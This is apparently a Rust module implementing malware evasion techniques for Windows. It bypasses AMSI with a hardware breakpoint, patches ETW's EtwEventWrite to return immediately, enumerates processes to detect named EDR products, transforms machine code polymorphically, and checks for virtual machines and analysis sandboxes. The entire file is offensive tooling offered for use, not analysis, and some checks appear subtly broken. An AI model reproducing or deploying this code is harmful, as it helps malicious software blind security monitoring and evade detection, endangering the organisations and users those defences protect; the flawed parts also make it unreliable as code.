use winapi::um::processthreadsapi::{GetCurrentProcess, GetCurrentThread};
use winapi::um::memoryapi::{VirtualProtectEx, VirtualQueryEx};
use winapi::um::debugapi::{SetThreadContext, GetThreadContext};
use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS, PAGE_EXECUTE_READWRITE};
use winapi::shared::minwindef::{DWORD, FALSE};
use std::collections::HashMap;
use std::ptr;
use rand::Rng;

pub struct EvasionEngine {
    edr_signatures: HashMap<String, Vec<String>>,
    polymorphic_patterns: Vec<PolymorphicPattern>,
}

struct PolymorphicPattern {
    original: Vec<u8>,
    alternatives: Vec<Vec<u8>>,
}

impl EvasionEngine {
    pub fn new() -> Self {
        let mut engine = EvasionEngine {
            edr_signatures: HashMap::new(),
            polymorphic_patterns: Vec::new(),
        };
        engine.init_edr_signatures();
        engine.init_polymorphic_patterns();
        engine
    }

    pub fn bypass_amsi_hardware(&self) -> bool {
        unsafe {
            let amsi_dll = obfstr::obfstr!("amsi.dll");
            let amsi_scan_buffer = obfstr::obfstr!("AmsiScanBuffer");
            
            let hmod = winapi::um::libloaderapi::GetModuleHandleA(amsi_dll.as_ptr() as *const i8);
            if hmod.is_null() {
                return false;
            }

            let func_addr = winapi::um::libloaderapi::GetProcAddress(hmod, amsi_scan_buffer.as_ptr() as *const i8);
            if func_addr.is_null() {
                return false;
            }

            let mut context: CONTEXT = std::mem::zeroed();
            context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            
            let current_thread = GetCurrentThread();
            if GetThreadContext(current_thread, &mut context) == 0 {
                return false;
            }

            context.Dr0 = func_addr as u64;
            context.Dr7 = 0x00000001;

            SetThreadContext(current_thread, &context) != 0
        }
    }

    pub fn bypass_etw_advanced(&self) -> bool {
        unsafe {
            let ntdll = obfstr::obfstr!("ntdll.dll");
            let etw_event_write = obfstr::obfstr!("EtwEventWrite");
            
            let hmod = winapi::um::libloaderapi::GetModuleHandleA(ntdll.as_ptr() as *const i8);
            if hmod.is_null() {
                return false;
            }

            let func_addr = winapi::um::libloaderapi::GetProcAddress(hmod, etw_event_write.as_ptr() as *const i8);
            if func_addr.is_null() {
                return false;
            }

            let patch_bytes = [0xC3u8];
            let mut old_protect: DWORD = 0;
            
            let result = VirtualProtectEx(
                GetCurrentProcess(),
                func_addr as *mut _,
                patch_bytes.len(),
                PAGE_EXECUTE_READWRITE,
                &mut old_protect
            );

            if result != 0 {
                ptr::copy_nonoverlapping(patch_bytes.as_ptr(), func_addr as *mut u8, patch_bytes.len());
                VirtualProtectEx(
                    GetCurrentProcess(),
                    func_addr as *mut _,
                    patch_bytes.len(),
                    old_protect,
                    &mut old_protect
                );
                true
            } else {
                false
            }
        }
    }

    pub fn detect_edr(&self) -> Vec<String> {
        let mut detected = Vec::new();
        
        for (edr_name, signatures) in &self.edr_signatures {
            if self.check_edr_presence(signatures) {
                detected.push(edr_name.clone());
            }
        }
        
        detected
    }

    pub fn polymorphic_transform(&self, code: &[u8]) -> Vec<u8> {
        let mut transformed = code.to_vec();
        
        for pattern in &self.polymorphic_patterns {
            if let Some(pos) = self.find_pattern(&transformed, &pattern.original) {
                if !pattern.alternatives.is_empty() {
                    let idx = rand::thread_rng().gen_range(0..pattern.alternatives.len());
                    let replacement = &pattern.alternatives[idx];
                    
                    transformed.splice(pos..pos+pattern.original.len(), replacement.clone());
                }
            }
        }
        
        self.add_dead_code(transformed)
    }

    pub fn check_vm_environment(&self) -> HashMap<String, bool> {
        let mut checks = HashMap::new();
        
        checks.insert("vmware".to_string(), self.detect_vmware());
        checks.insert("virtualbox".to_string(), self.detect_virtualbox());
        checks.insert("hyper-v".to_string(), self.detect_hyperv());
        checks.insert("qemu".to_string(), self.detect_qemu());
        checks.insert("wine".to_string(), self.detect_wine());
        checks.insert("sandbox".to_string(), self.detect_sandbox());
        
        checks
    }

    fn init_edr_signatures(&mut self) {
        self.edr_signatures.insert("CrowdStrike".to_string(), vec![
            "CsFalconService".to_string(),
            "csagent.exe".to_string(),
            "csfalcon.sys".to_string(),
        ]);
        
        self.edr_signatures.insert("SentinelOne".to_string(), vec![
            "SentinelAgent".to_string(),
            "SentinelOne".to_string(),
            "sentinelagent.exe".to_string(),
        ]);
        
        self.edr_signatures.insert("Defender".to_string(), vec![
            "MsMpEng.exe".to_string(),
            "MpCmdRun.exe".to_string(),
            "NisSrv.exe".to_string(),
        ]);
        
        self.edr_signatures.insert("CarbonBlack".to_string(), vec![
            "cb.exe".to_string(),
            "carbonblack".to_string(),
            "cbcomms".to_string(),
        ]);
    }

    fn init_polymorphic_patterns(&mut self) {
        self.polymorphic_patterns.push(PolymorphicPattern {
            original: vec![0x48, 0x01, 0xC0],
            alternatives: vec![
                vec![0x48, 0x8D, 0x04, 0x00],
                vec![0x48, 0xFF, 0xC0, 0x48, 0xFF, 0xC0],
            ],
        });
        
        self.polymorphic_patterns.push(PolymorphicPattern {
            original: vec![0x48, 0x89, 0xC1],
            alternatives: vec![
                vec![0x48, 0x8B, 0xC8],
                vec![0x50, 0x59],
            ],
        });
    }

    fn check_edr_presence(&self, signatures: &[String]) -> bool {
        use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};
        
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
                return false;
            }

            let mut entry: PROCESSENTRY32 = std::mem::zeroed();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

            if Process32First(snapshot, &mut entry) != 0 {
                loop {
                    let process_name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr())
                        .to_string_lossy()
                        .to_lowercase();

                    for sig in signatures {
                        if process_name.contains(&sig.to_lowercase()) {
                            winapi::um::handleapi::CloseHandle(snapshot);
                            return true;
                        }
                    }

                    if Process32Next(snapshot, &mut entry) == 0 {
                        break;
                    }
                }
            }

            winapi::um::handleapi::CloseHandle(snapshot);
            false
        }
    }

    fn find_pattern(&self, haystack: &[u8], needle: &[u8]) -> Option<usize> {
        haystack.windows(needle.len()).position(|window| window == needle)
    }

    fn add_dead_code(&self, mut code: Vec<u8>) -> Vec<u8> {
        let dead_code_patterns = vec![
            vec![0x90],
            vec![0x48, 0x89, 0xC0],
            vec![0x48, 0x31, 0xC0, 0x48, 0x31, 0xC0],
        ];
        
        let mut rng = rand::thread_rng();
        let insertions = rng.gen_range(3..8);
        
        for _ in 0..insertions {
            let pos = rng.gen_range(0..code.len());
            let pattern_idx = rng.gen_range(0..dead_code_patterns.len());
            let pattern = &dead_code_patterns[pattern_idx];
            
            for (i, &byte) in pattern.iter().enumerate() {
                code.insert(pos + i, byte);
            }
        }
        
        code
    }

    fn detect_vmware(&self) -> bool {
        unsafe {
            let key_path = obfstr::obfstr!("HARDWARE\\DESCRIPTION\\System");
            let value_name = obfstr::obfstr!("SystemBiosVersion");
            
            let mut hkey = ptr::null_mut();
            let result = winapi::um::winreg::RegOpenKeyExA(
                winapi::um::winreg::HKEY_LOCAL_MACHINE,
                key_path.as_ptr() as *const i8,
                0,
                winapi::um::winnt::KEY_READ,
                &mut hkey
            );
            
            if result == 0 {
                let mut buffer = [0u8; 256];
                let mut buffer_size = buffer.len() as u32;
                
                let read_result = winapi::um::winreg::RegQueryValueExA(
                    hkey,
                    value_name.as_ptr() as *const i8,
                    ptr::null_mut(),
                    ptr::null_mut(),
                    buffer.as_mut_ptr(),
                    &mut buffer_size
                );
                
                winapi::um::winreg::RegCloseKey(hkey);
                
                if read_result == 0 {
                    let value = std::ffi::CStr::from_ptr(buffer.as_ptr() as *const i8)
                        .to_string_lossy()
                        .to_lowercase();
                    return value.contains("vmware") || value.contains("virtual");
                }
            }
        }
        false
    }

    fn detect_virtualbox(&self) -> bool {
        unsafe {
            let vbox_guest = obfstr::obfstr!("VBoxService.exe");
            let snapshot = winapi::um::tlhelp32::CreateToolhelp32Snapshot(
                winapi::um::tlhelp32::TH32CS_SNAPPROCESS, 0
            );
            
            if snapshot != winapi::um::handleapi::INVALID_HANDLE_VALUE {
                let mut entry: winapi::um::tlhelp32::PROCESSENTRY32 = std::mem::zeroed();
                entry.dwSize = std::mem::size_of::<winapi::um::tlhelp32::PROCESSENTRY32>() as u32;
                
                if winapi::um::tlhelp32::Process32First(snapshot, &mut entry) != 0 {
                    loop {
                        let process_name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr())
                            .to_string_lossy();
                        
                        if process_name.eq_ignore_ascii_case(vbox_guest) {
                            winapi::um::handleapi::CloseHandle(snapshot);
                            return true;
                        }
                        
                        if winapi::um::tlhelp32::Process32Next(snapshot, &mut entry) == 0 {
                            break;
                        }
                    }
                }
                winapi::um::handleapi::CloseHandle(snapshot);
            }
        }
        false
    }

    fn detect_hyperv(&self) -> bool {
        unsafe {
            use std::arch::x86_64::__cpuid;
            let cpuid_result = __cpuid(0x40000000);
            let vendor_string = format!("{:08x}{:08x}{:08x}", 
                cpuid_result.ebx, cpuid_result.ecx, cpuid_result.edx);
            vendor_string.contains("Microsoft Hv")
        }
    }

    fn detect_qemu(&self) -> bool {
        unsafe {
            let key_path = obfstr::obfstr!("HARDWARE\\Description\\System");
            let value_name = obfstr::obfstr!("VideoBiosVersion");
            
            let mut hkey = ptr::null_mut();
            let result = winapi::um::winreg::RegOpenKeyExA(
                winapi::um::winreg::HKEY_LOCAL_MACHINE,
                key_path.as_ptr() as *const i8,
                0,
                winapi::um::winnt::KEY_READ,
                &mut hkey
            );
            
            if result == 0 {
                let mut buffer = [0u8; 256];
                let mut buffer_size = buffer.len() as u32;
                
                let read_result = winapi::um::winreg::RegQueryValueExA(
                    hkey,
                    value_name.as_ptr() as *const i8,
                    ptr::null_mut(),
                    ptr::null_mut(),
                    buffer.as_mut_ptr(),
                    &mut buffer_size
                );
                
                winapi::um::winreg::RegCloseKey(hkey);
                
                if read_result == 0 {
                    let value = std::ffi::CStr::from_ptr(buffer.as_ptr() as *const i8)
                        .to_string_lossy()
                        .to_lowercase();
                    return value.contains("qemu") || value.contains("bochs");
                }
            }
        }
        false
    }

    fn detect_wine(&self) -> bool {
        unsafe {
            let wine_dll = obfstr::obfstr!("ntdll.dll");
            let wine_version = obfstr::obfstr!("wine_get_version");
            
            let hmod = winapi::um::libloaderapi::GetModuleHandleA(wine_dll.as_ptr() as *const i8);
            if !hmod.is_null() {
                let wine_func = winapi::um::libloaderapi::GetProcAddress(
                    hmod, wine_version.as_ptr() as *const i8
                );
                return !wine_func.is_null();
            }
        }
        false
    }

    fn detect_sandbox(&self) -> bool {
        let sandbox_indicators = vec![
            "sample", "maltest", "test", "sandbox", "malware",
            "virus", "analysis", "joe", "triage", "hybrid",
        ];
        
        unsafe {
            let mut buffer = [0u16; 256];
            let size = winapi::um::sysinfoapi::GetComputerNameW(
                buffer.as_mut_ptr(),
                &mut (buffer.len() as u32)
            );
            
            if size != 0 {
                let computer_name = String::from_utf16_lossy(&buffer)
                    .trim_end_matches('\0')
                    .to_lowercase();
                
                for indicator in &sandbox_indicators {
                    if computer_name.contains(indicator) {
                        return true;
                    }
                }
            }
        }
        false
    }
}
